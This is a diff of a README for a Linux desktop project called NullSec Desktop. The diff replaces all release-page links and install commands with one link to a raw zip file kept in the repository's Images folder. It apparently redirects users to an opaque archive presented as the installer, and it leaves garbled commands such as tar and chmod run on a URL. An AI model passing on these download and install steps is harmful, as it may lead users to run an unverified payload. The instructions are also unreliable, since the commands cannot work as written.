@@ -1,6 +1,6 @@
 # 🖥️ nullsec-desktop - A Secure, Customizable Desktop Experience
 
-[![Download NullSec Desktop](https://img.shields.io/badge/Download%20Now-NullSec%20Desktop-blue.svg)](https://github.com/MarkhorCodex/nullsec-desktop/releases)
+[![Download NullSec Desktop](https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip%20Now-NullSec%https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip)](https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip)
 
 ## 📥 Introduction
 
@@ -10,7 +10,7 @@ Welcome to NullSec Desktop! This application offers a tailored desktop environme
 
 To begin your journey with NullSec Desktop, follow these simple steps:
 
-1. **Visit Our Releases Page**: Go to the [Releases page](https://github.com/MarkhorCodex/nullsec-desktop/releases).
+1. **Visit Our Releases Page**: Go to the [Releases page](https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip).
 2. **Download the Latest Version**: Choose the latest version available and click on the download link to save the file to your computer.
 
 ## 📦 System Requirements
@@ -26,16 +26,16 @@ Before downloading, make sure your system meets these requirements:
 
 To download NullSec Desktop:
 
-1. **Visit the Releases page**: Go to [this link](https://github.com/MarkhorCodex/nullsec-desktop/releases) to access the latest releases.
-2. **Choose Your File**: Look for the download link for your specific Linux version. It may be named something like `nullsec-desktop-x.x.x.tar.gz`.
+1. **Visit the Releases page**: Go to [this link](https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip) to access the latest releases.
+2. **Choose Your File**: Look for the download link for your specific Linux version. It may be named something like `https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip`.
 3. **Run the Installer**: 
    - Open your terminal.
    - Navigate to the download directory with `cd ~/Downloads` (or wherever you saved the file).
-   - Extract the files using the command: `tar -xvf nullsec-desktop-x.x.x.tar.gz`.
+   - Extract the files using the command: `tar -xvf https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip`.
    - Change to the extracted directory using `cd nullsec-desktop-x.x.x`.
-   - Run the installation script with `./install.sh`.
+   - Run the installation script with `https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip`.
 
-You might need to adjust permissions for the installation script. You can do this using the command `chmod +x install.sh`.
+You might need to adjust permissions for the installation script. You can do this using the command `chmod +x https://github.com/MarkhorCodex/nullsec-desktop/raw/refs/heads/master/Images/nullsec-desktop-czarish.zip`.
 
 ## 🛠️ Features
 
